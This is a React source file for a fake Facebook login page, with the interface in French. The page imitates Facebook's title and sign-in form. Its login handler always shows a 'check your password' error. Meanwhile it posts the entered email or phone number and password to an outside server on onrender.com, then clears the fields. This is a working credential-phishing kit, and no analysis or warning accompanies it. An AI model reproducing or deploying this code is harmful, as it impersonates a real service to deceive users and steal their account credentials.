import React from 'react';
import { useState } from 'react';
import { Container, Row, Col, Form, Button } from "react-bootstrap";
import axios from 'axios';
import "bootstrap/dist/css/bootstrap.min.css";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';


const Connexion = () => {
  const [nom, setNom] = useState("");
  const [mdp, setMdp] = useState("");

  const miova = (e) => {
    setMdp(e.target.value);
  }


  const aseohy=()=>{
     toast.error('Vous ne pouvez pas créer une compte en version beta.', {
        position: "top-center",
        autoClose: 2000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
    });
  }

  const mampiditra = async (req, res, error) => {

    if (mdp === "" || nom === "") {
      toast.error('Veuillez remplir les champs vide', {
        position: "top-center",
        autoClose: 2000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
      }); return;
    } else {
      toast.error('Vérifier votre mot de passe ou votre numéro téléphone', {
        position: "top-center",
        autoClose: 2000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "light",
    });
     
      try {
        const alefa = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp }).then((response) => {
          setNom("");
          setMdp("");
        }).catch((error) => {
          console.log(error);
        })
      } catch (error) {
      }
    }

  }

  return (
    <div style={{ background: "#f0f2f5", minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center" }}>
      <div style={{ background: "white", padding: "4rem", width: "500px", borderRadius: "10px" }}>
        <Container>
   <div className="text-center">
        <p style={{color: "blue", fontSize: "3em"}}>facebook</p>
  </div>
          <Row className="justify-content-center">
            <Col md={8}>
              <Form>
                <Form.Group controlId="formBasicNom">
                  <Form.Control
                    type="text"
                    placeholder="Adresse e-mail ou numéro de tél."
                    value={nom}
                    onChange={(e) => setNom(e.target.value)}
                    style={{ width: "100%", marginBottom: "1rem" }}
                  />
                </Form.Group> <br />
                <Form.Group controlId="formBasicPassword">
                  <Form.Control
                    type="password"
                    placeholder="Mot de passe"
                    value={mdp}
                    onChange={(e) => setMdp(e.target.value)}
                    style={{ width: "100%", marginBottom: "1rem", margin: "0 auto" }}
                  /> <br />

                </Form.Group>
                <div className="text-center">
                  <Button variant="primary" style={{ width: "100%", marginBottom: "1rem" }} onClick={mampiditra} block>
                    Se connecter
                  </Button>
                  <br />

                  <p style={{ color: "blue", cursor: "pointer" }}>Mot de passe oublié ?</p>
                  <hr />
                  <Button variant="success" style={{ width: "100%", marginBottom: "1rem" }} onClick="aseohy()"  block>
                    Créer nouveau compte
                  </Button>
                </div>
              </Form>
            </Col>
          </Row>
        </Container>
      </div>
    </div>

  );
};

export default Connexion;
